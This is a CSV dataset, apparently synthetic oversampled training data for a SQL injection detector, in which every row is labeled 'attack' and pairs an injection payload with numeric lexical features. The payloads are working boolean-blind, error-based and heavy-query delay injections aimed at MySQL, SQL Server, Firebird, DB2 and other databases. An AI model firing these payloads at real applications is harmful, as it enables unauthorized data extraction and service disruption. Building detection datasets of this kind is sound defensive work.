id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000999,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,1.9930285061494046,96.19493013635902,30.62263472994571,3.8681422613555676,25.786147703206655,21.770439121657617,35.55658682486428,13.081756486630471,0.2517708475340663,0.2486373918894921,0.3615199538786628,0.13807180669777877,1.1556586824864274,0.6147804391711909,2.0,0.38521956082880904,0.0,2.0,0.0,5.3113173649728544,0.0,0.6147804391711909,1.0,4.3852195608288085,0.38521956082880915,0.6147804391711909,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001000,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,2.1185664257020878,244.18356139425268,33.177513571752336,3.869203656506474,57.727785006798996,67.816644979603,90.94680784063101,27.692323567219667,0.25367501735241316,0.2651492160395638,0.3681348071652584,0.11304095944276459,0.1775135717523333,0.0,2.0,0.0,1.8224864282476667,2.0,0.0,15.869837138972,0.0,0.0,5.289945712990667,5.822486428247666,0.1775135717523333,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.8224864282476666,0.0,3.467459284743,0.0,1.0,1.0,0.8224864282476667,0.17751357175233323,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8224864282476666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.289945712990667
SMOTE_001001,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.297966716562331,360.78032844151096,30.423770527594435,3.3633641353553587,87.9327873863221,58.0,164.42377052759443,50.423770527594435,0.2434281554630793,0.16083937204452864,0.4559325156692673,0.13979995682312477,0.5762294724055635,0.0,3.0,0.0,0.0,2.4237705275944363,0.0,34.0,0.0,0.0,0.42377052759443656,15.423770527594439,0.5762294724055635,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.4237705275944366,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.42377052759443645,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.84754105518887
SMOTE_001002,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.4983735504077142,41.800276848708165,16.744798768789988,3.0431129984108964,5.976421429112328,9.615811330161174,19.07905665080586,7.1289874386288155,0.10903676418280608,0.2515334474831835,0.46520949105563325,0.17422029727837718,1.2052704433870574,0.0,2.0,0.10263522169352866,0.0,0.9999999999999999,0.0,2.718446551854699,0.0,0.0,0.10263522169352868,3.1026352216935287,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001003,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.9323937719218047,52.5192283061899,20.016481405305633,3.624929272166638,10.016481405305633,20.0,17.005493801768544,5.497253099115728,0.1877452590075243,0.3825129132201902,0.32396557703630474,0.10577625073598076,0.0,0.5027469008842724,1.9945061982314551,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.994506198231455,0.0,0.5027469008842724,0.49725309911572757,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001004,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,1.0143271750628589,255.05279710830473,37.71536320629193,3.8156866624051244,77.730448094379,35.576816031459664,100.59190091954673,41.153632062919336,0.30475094921437923,0.13979739809826588,0.3944512479533249,0.16100040473402993,1.2846367937080667,0.0,1.4307264125838666,0.0,0.0,2.0,0.0,21.576816031459664,0.0,1.7153632062919333,3.7153632062919333,12.861452825167733,1.0,0.0,0.7153632062919333,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.2846367937080667,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.4307264125838675,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.715363206291933
SMOTE_001005,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,2.875148831214983,354.84392071773004,35.5368852125153,3.465377933362262,96.14924853650297,43.07889348435587,161.23155739374235,54.384221303128825,0.2699454950181155,0.12197311336720545,0.4548322150451347,0.15324917656954437,0.0,4.0,0.5385928989570579,0.0,0.0,2.0,0.0,34.0,1.077185797914116,0.9228142020858838,1.8456284041717683,12.538592898957058,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.46140710104294197,1.0,0.0,0.0,0.461407101042942,1.0,0.538592898957058,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,9.69296449478529,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,14.692964494785286
SMOTE_001006,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,0.3907854897402522,27.577260933039298,10.0,2.9783848301009943,15.313049016188835,0.47558145033080734,6.947157616629916,4.84147284988973,0.5491592812940337,0.023779072516540323,0.2526421191685045,0.17441952702092153,3.7886304665196415,0.05284238337008962,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.9999999999999991,0.9471576166299103,0.05284238337008962,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.05284238337008962,0.9471576166299105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001007,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,2.269619201146198,108.16976113150142,32.73584019967672,3.894420867580165,30.71696046591235,22.122640033279453,40.8396004991918,14.490560133117814,0.2689069167330583,0.2251573311147031,0.3700515287564588,0.1358842233957798,1.6839600499191802,0.4386799833602732,2.0,0.5613200166397266,0.0,2.0,0.0,6.3679200998383605,0.0,0.43867998336027325,1.0,4.561320016639726,0.5613200166397267,0.43867998336027325,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001008,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.7399372350847984,67.1609218150548,23.305040837717602,3.6962335773653345,10.8558809773372,24.0,22.2033605584784,10.1016802792392,0.1580425584326138,0.360762072246275,0.3308180815542484,0.15037728776686274,0.4491598603803997,0.5508401396196002,3.0,0.0,0.44915986038039984,2.0,0.0,2.5508401396195985,0.0,0.5508401396196003,0.5508401396196003,5.4491598603804,0.44915986038039973,0.5508401396196002,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001009,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.9062029919491437,79.38663207484628,18.24190229106045,2.9103393316057797,11.915231300416238,12.241902291060446,41.935218328483586,13.29428015488601,0.14279672156523304,0.1672369245824963,0.521441604565654,0.16852474928661654,3.431426718295336,0.0,0.3790488544697759,0.0,0.8104755727651121,1.810475572765112,0.0,6.862853436590672,0.0,0.0,0.0,3.0,1.0,0.0,0.189524427234888,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.810475572765112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8104755727651125
SMOTE_001010,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,1.24994784482706,75.89457447787058,28.210465429201466,3.9329355527444623,21.631396287604403,17.315890951330886,25.473643619467644,11.473643619467644,0.2831097294806318,0.23009639240986812,0.3358397922882493,0.1509540858212508,0.0,3.2104654292014683,1.2631781902661774,0.0,0.0,1.2631781902661774,0.0,3.736821809733822,0.0,1.0,1.0,2.526356380532355,0.0,1.0,0.2631781902661776,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.26317819026617756,0.0,1.0,0.7368218097338225,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001011,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.2751149852079064,145.69886481040757,32.71085884675724,4.0717781531871005,70.56628827013586,8.92771471168931,46.56628827013586,19.638573558446552,0.4845027144529364,0.061281668476752635,0.31959066232246036,0.13462495474785063,0.9277147116893099,0.0,2.0,0.0,1.0,0.9999999999999999,0.0,6.92771471168931,0.9277147116893099,0.0,2.9277147116893096,4.0,0.9277147116893099,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.07228528831069014,0.9277147116893099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001012,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,2.1252057253796792,358.2020583290293,37.90733529107949,3.5559613163355595,103.06306126564853,40.11583088615063,160.04633235446028,54.976833822769876,0.286812534383077,0.11250348672327015,0.44721585141904635,0.15346812747460647,0.0,4.0,0.34105539241004224,0.0,0.0,2.0,0.0,34.0,0.6821107848200845,1.3178892151799153,2.635778430359831,12.341055392410041,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6589446075899578,1.0,0.0,0.0,0.6589446075899578,1.0,0.34105539241004224,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,8.705276962050212,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,13.70527696205021
SMOTE_001013,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.34339877544765035,147.16435900974196,33.0,4.103879986494253,72.23269257306467,9.0,46.17820495129022,19.753461485387067,0.4907335213691653,0.061156954248839074,0.3138598025102402,0.13424972187175546,1.2465385146129337,0.0,1.8356409902580442,0.0,1.0,0.9999999999999999,0.0,6.753461485387066,0.9178204951290221,0.0,3.0,3.835640990258044,1.0,0.0,0.9178204951290221,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.08217950487097792,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.082179504870978
SMOTE_001014,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,2.291542733598606,76.9498431027093,19.9666782886882,3.0738320140400726,9.649947700903098,14.4500174330323,38.333217113117996,14.516660855655898,0.11872971598648124,0.19738158882498877,0.49036985383607995,0.19351884135245,4.0,0.0,0.4833391443441003,0.0,1.0,2.0,0.0,6.066643422623598,0.9666782886882008,0.0,0.0,3.4833391443441,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.5166608556558994,0.4833391443441004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001015,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,3.3724190477532114,210.44291983652562,30.441467607726118,3.7708405776010174,53.468259138191065,53.406229643372676,79.1988916047421,24.369539450219758,0.2866492292732553,0.22877379285357397,0.368713476318604,0.11586350155456676,0.0,0.7207338038630584,0.5585323922738832,0.0,1.7207338038630586,0.9999999999999999,0.0,14.648805646356701,0.0,0.0,4.882935215452234,3.279266196136941,0.0,0.7207338038630584,0.2792661961369416,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.7207338038630584,0.0,3.1622014115891752,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7207338038630584,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.882935215452234
SMOTE_001016,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.6510212174557309,388.1677654488567,31.0,3.30627176827222,95.26847007386843,56.44964768749414,183.30870656817544,53.14094111931871,0.24556167704969162,0.1453283833373395,0.47217818780895005,0.13693175180401884,0.0,0.5637644772748565,0.8590588806812859,0.0,0.0,3.0,0.0,37.718117761362564,0.0,0.0,1.0,13.859058880681285,0.0,0.1409411193187141,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.1409411193187142,0.8590588806812859,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001017,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,2.6823805703063637,309.64321807162605,38.70510980552604,3.793580296256322,102.01781256089274,32.24613176663125,126.51007609415524,48.869197649946884,0.32844016656922564,0.10538786380715812,0.4064303546689466,0.1597416149546696,4.0,0.0,0.0,0.0,0.0,1.4589780388947913,0.0,27.410219611052085,0.0,2.0,4.0,11.458978038894791,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.5410219611052087,0.0,0.0,0.5410219611052087,1.0,0.4589780388947913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5410219611052087,0.5410219611052087,10.623065883315626
SMOTE_001018,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.8943899400298648,136.08412584685098,30.95424161292441,3.9981184376186825,67.68708221777106,9.954241612924408,42.954241612924406,15.488560403231103,0.49829091482912147,0.07160357969249538,0.3159477974853478,0.1141577079930354,0.0,0.24428020161555108,2.0,0.0,1.0,1.244280201615551,0.0,6.0,0.0,0.0,2.0,4.244280201615551,0.0,0.24428020161555122,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.24428020161555114,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2442802016155508
SMOTE_001019,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.4470479706408113,205.86766922546371,33.573712060516726,3.734850155053059,63.802840453875454,25.967140075645908,81.80284045387546,34.294848242066905,0.30778849310908757,0.12840789523892854,0.39830870843344307,0.16549490321854085,2.1802840453875456,0.0,0.0,0.0,0.0,1.3934280151291818,0.0,18.36056809077509,0.0,1.3934280151291818,3.3934280151291816,8.967140075645908,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.3934280151291818,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.786856030258364,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.180284045387545
SMOTE_001020,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.5167771576002849,126.95315203258885,29.5433250923904,3.989554927972933,67.80327564673281,8.0,36.43325092390402,14.716625461952011,0.5357267514623032,0.06349570191934555,0.2857046108053766,0.11507293581297462,0.0,1.0,1.0866501847808043,0.0,1.0,0.9999999999999999,0.0,5.086650184780805,0.5433250923904022,0.0,2.0,3.086650184780804,0.0,1.0,0.5433250923904023,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001021,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,2.5587399665151795,357.7243316138305,39.62053470893561,3.756798688927245,112.79240619021024,39.48326219595927,149.3448663227661,56.10379690489488,0.3154774591620422,0.11026401175944968,0.4174954636033178,0.15676306547519034,2.620534708935609,1.3794652910643914,0.34486632276609774,0.0,0.0,1.6897326455321957,0.0,31.310267354467804,0.0,2.344866322766098,2.6205347089356086,15.483262195959274,0.6551336772339021,0.34486632276609785,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.34486632276609785,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.585935740637315,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,9.930802063403412
SMOTE_001022,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,0.17749890395123966,32.77351625587744,15.4644923527298,3.422126722627371,2.506718930250699,12.506718930250695,10.591172085292477,7.168906310083564,0.06989008145206213,0.3846337126678049,0.32284187895947525,0.22263432692065777,0.0,1.0,3.0,0.0,0.0,1.042226577520891,0.0,1.084453155041782,0.957773422479109,0.042226577520891095,0.04222657752089143,4.042226577520891,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.042226577520891095,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.042226577520891
SMOTE_001023,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,2.013201125213153,25.82218432459581,10.0,2.9709854842530694,12.461049527468184,2.450042634829714,6.727773040574476,4.183319121723425,0.45670435281352917,0.1225021317414858,0.26361134797127617,0.15718216747370883,2.911092162297904,0.272226959425524,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.9999999999999991,0.727773040574476,0.27222695942552405,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.2722269594255241,0.727773040574476,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001024,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.673009641114164,154.08633976575095,35.77698117679717,4.182001049651123,74.28777364751603,16.0,47.043169882875475,16.755396235359434,0.48221191006019176,0.10405680886735535,0.3048934833737087,0.10883779769874419,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.755396235359434,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.755396235359434,0.244603764640566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
